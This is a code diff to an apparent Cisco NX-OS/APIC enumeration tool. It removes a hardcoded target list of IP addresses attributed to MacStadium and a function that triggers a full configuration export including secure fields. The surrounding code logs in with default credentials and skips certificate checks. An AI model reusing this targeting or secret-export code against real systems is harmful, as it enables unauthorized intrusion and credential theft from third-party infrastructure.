@@ -203,17 +203,6 @@ APIC_DEFAULT_CREDS = [
     ("admin", ""),
 ]
 
-# MacStadium-specific APIC/NX-OS targets inferred from network recon
-MACSTADIUM_CISCO_TARGETS = [
-    {"ip": "207.254.14.1",  "role": "nxos-switch",      "site": "atl"},  # confirmed OU=dcnxos nginx/1.7.10
-    {"ip": "207.254.14.2",  "role": "apic-candidate",  "site": "atl"},
-    {"ip": "207.254.14.3",  "role": "apic-candidate",  "site": "atl"},
-    {"ip": "207.254.14.4",  "role": "apic-candidate",  "site": "atl"},
-    {"ip": "207.254.14.10", "role": "nxos-leaf",        "site": "atl"},
-    {"ip": "207.254.14.11", "role": "nxos-leaf",        "site": "atl"},
-    {"ip": "207.254.14.20", "role": "nxos-spine",       "site": "atl"},
-    {"ip": "207.254.14.21", "role": "nxos-spine",       "site": "atl"},
-]
 
 # SSL context that skips cert validation
 _SSL_CTX = ssl.create_default_context()
@@ -229,8 +218,6 @@ def classify_by_cert_ou(host: str, port: int = 443, timeout: float = 5.0) -> dic
 
     OU=dcnxos  → NX-OS switch  (NX-API at /api/aaaLogin.json)
     OU=dcapic  → APIC controller (APIC REST at /api/aaaLogin.json)
-
-    # MacStadium: 207.254.14.1 confirmed OU=dcnxos (NX-OS 9.x)
     """
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
@@ -460,9 +447,6 @@ def apic_enumerate(apic_host: str, token: str) -> dict:
 
     # Out-of-band management IP assignments per node
     findings["oob_mgmt"] = apic_get_out_of_band_mgmt(apic_host, token)
-
-    # Config export check (list existing policies; trigger only if none exist)
-    findings["config_export"] = apic_export_config(apic_host, token)
 
     return findings
 
@@ -1277,64 +1261,6 @@ def apic_get_out_of_band_mgmt(apic_host: str, token: str) -> list:
     return results
 
 
-def apic_export_config(apic_host: str, token: str,
-                       export_name: str = "ablation-export") -> dict:
-    """Trigger a fabric configuration export (backup).
-
-    configExportP defines a named export policy. POSTing to instantiate it
-    with 'adminSt: triggered' causes APIC to immediately write a full fabric
-    configuration snapshot to the configured remote path (or local APIC storage).
-
-    The export includes ALL tenant policy, fabric access policy, VMM integration
-    config, and AAA configuration — essentially the entire MIM serialized to JSON/XML.
-
-    If no remote path is configured, the export lands at:
-      /data/techsupport/ on the APIC (accessible via SCP or the GUI export tab).
-
-    The trigger POST body also supports 'format: json' or 'format: xml'.
-    """
-    # First, check if an export policy already exists (avoid overwriting production backup)
-    check_path = "/api/node/class/configExportP.json"
-    existing = _apic_get(apic_host, check_path, token)
-    existing_policies = [
-        item.get("configExportP", {}).get("attributes", {}).get("name")
-        for item in existing.get("imdata", [])
-    ]
-
-    result = {
-        "existing_export_policies": existing_policies,
-        "trigger_attempted": False,
-        "trigger_response": None,
-        "note": (
-            "configExportP with adminSt=triggered exports full fabric config. "
-            "Export lands at /data/techsupport/ on APIC if no remote target. "
-            "Exported file contains all tenant policy, VMM creds refs, AAA config."
-        ),
-    }
-
-    # Only trigger if no production export policy exists (avoid interfering)
-    if not existing_policies:
-        trigger_body = {
-            "configExportP": {
-                "attributes": {
-                    "name": export_name,
-                    "adminSt": "triggered",
-                    "format": "json",
-                    "includeSecureFields": "yes",
-                    "snapshot": "false",
-                    "targetDn": "",
-                }
-            }
-        }
-        trigger_path = "/api/mo/uni/fabric/configexp-" + export_name + ".json"
-        resp = _apic_post(apic_host, trigger_path, trigger_body, token)
-        result["trigger_attempted"] = True
-        result["trigger_response"] = resp
-    else:
-        result["skip_reason"] = "existing export policies found — not overwriting"
-
-    return result
-
 
 def probe_nxos_ports(host: str) -> dict:
     """TCP port probe for NX-OS management surface."""
@@ -1559,8 +1485,8 @@ def probe_dcnm(host: str) -> dict:
 class NXOSEnumerator:
     """Cisco NX-OS, ACI/APIC, and VXLAN enumeration for Ablation."""
 
-    def __init__(self, targets=None):
-        self.targets = targets or MACSTADIUM_CISCO_TARGETS
+    def __init__(self, targets):
+        self.targets = targets
         self.findings = []
 
     def run(self) -> dict:
